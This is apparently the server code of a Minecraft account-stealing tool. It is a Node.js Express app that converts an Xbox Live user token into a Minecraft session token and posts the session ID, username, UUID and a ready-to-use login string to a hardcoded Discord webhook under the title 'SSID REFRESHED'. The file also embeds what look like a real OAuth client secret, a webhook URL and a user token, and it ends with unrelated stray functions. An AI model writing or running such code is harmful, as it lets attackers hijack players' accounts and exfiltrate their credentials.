//XBL TOKEN
//const userToken = 'eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.qVNVmYinTR4LW1gllaSyWk-1zCgoV5_VkquAMJU1eS8tQXjlFVR2NBF_5ckb_Z91f5D8Dim-YEPGc6_FavwWWrvCCBxVeR8dq7GFbF31W45KmQLW4tQ88fncsycTqu5BhkaEm03BNNsJC8iQWXiw0f_OALGXftz4ckm3lCVu76mGzd_1HF7_-fSNBn7-nSKO2uBkWPeFbVzrkPDLv4Uf3oTdzsRvMiZ6ini2_Dwm5ZEx4MKnZkUgLoHmXUL2J9vxp-yReE-6-XtL7_7SyGHY-WG97g5lx9-oQGYg1t5c-q0PjNmqAvgHwcTmCbY4pT4NKfRRPRTZizCKjuMCTObfzw.6yfsn-e5nFEYTaPfcAkY3w.j3HyIXzRk7JzOhyApuTuiBkoeYkZVn3mj7YKFAN0kMdw70kFUS4DQMY0lP4VQHOsj2fp8h1xx6FW-SX-gCafXT2-JZ7EQO-8klfeyofeAIx-5e1xO6oIUvd9fwE8X4mrV33GxvlQx9wTA19TvgnMDK1HAqthYVesO8bFaSlHhuRjSwcBxc8bK9Mfw9Xzwy81qRomrkvQ0ACP0ioEDz73M-9HbHuGtlYO-3GPQZIEHd7U86bzsNb3hBGKotRgCv51zn2i9vzMSAsiSphW-dL-gQtY-BdzRuB6Zf_cHjFqRGsZEDxuWotVcCuzKXiTr3k6elqGtxDm8BFrwIq4U0RSHcg25fg7WQSLFf-hnvS9MEECgPQ6Me8t84nDlCFFDR8TCSlY_cNHOM9J5CK4gCW9oKablg_ueQUrahoQJn8vX3bFRQuTMXXsw_bKV1WvEzVh9hQxYZWHMPNgxT7F-GHU29oUte5HHKpY8m1Y5bUlSfUdUqL7H77Wf9B2KAH9dGAZdCcdQfgiQjF6Jr9inhuV2vy-IoZ5qKFGpaTILrmnlWpHDMvwYj5FybZJbdP2UC0oxYeuEXAF7tfVc0MK-Xruh_ghkT-8xAUzpt3L0ctBXHpngZceBoRkZz5CbFCcZEV5GlQG0ROKi97xqJa4VXAvTnxsT7hNUz__1wwsLSlzxpGFnqqc51K9-5pMCTuLTGYRzVFRxfsEJf4E_ibs0EDt-nE9tfBl2f530KF8h5fqoGLwDCh4nIeujOhn2BibVz-UuMKChxqQdlFEaKdDFF3Xv_17vxiIo75MJMi_bsGrh2kXqi_XrxL0R89IHKZm67-qz1rjZnNGWu_0I7VPyIeuwcMqZM9gkdwB9mstedFNOnNy8c1ZaVI9xyCVkh3IVP66a1u2Xn0FEcYKNtdPpmcZTebfedRxkeG7t9GAsh8WaWzXlMS26Uq82cSU4HkO6jrm0tPIflAYB3JDDPc4zQjv0uM3wBCkDz9CvmeoD6A8VTVUQ2m5cwuXhpsG98xih4zF.XT8ET9qx9QFrKxyCmVF2qQ'

// Configuration
const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
const redirect_uri = 'https://linkdiscord.herokuapp.com'
const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
// Config end
const axios = require('axios')
const express = require('express')
const path = require('path')
const app = express()
const port = process.env.PORT || 3000

console.log('got them both')
app.get('/', async (req, res) => {
    console.log('no query code for u') 
var options = {

        root: path.join(__dirname)

    };

     

    var fileName = 'index.html';

    res.sendFile(fileName, options);
 
    //res.send('Success! You can exit this page and return to discord.')
    try {
        console.log('1')
        console.log('all of those parameters were obsolete, the fun part begins')
        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
        const xstsTokenHashArray = await getXSTSToken(userToken)
        console.log('got array')
        const xstsToken = xstsTokenHashArray[0]
        const userHash = xstsTokenHashArray[1]
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, userToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return [response.data['Token'], response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, userToken) {
    const url = webhook_url
    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "||```" + userToken + "```||",
        embeds: [{
            title: "SSID REFRESHED", color: 0x00ff50, fields: [
                {name: "Username", value: username, inline: true},
                {name: "UUID", value: uuid, inline: true},
                {name: "Ip", value: "[Local Address]", inline: true},
                {name: "SessionID", value: bearerToken, inline: false},
                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
            ]
        }]
    }
    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
}

function returnText() {
  let input = document.getElementById("userInput").value
  alert(input)
}

const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
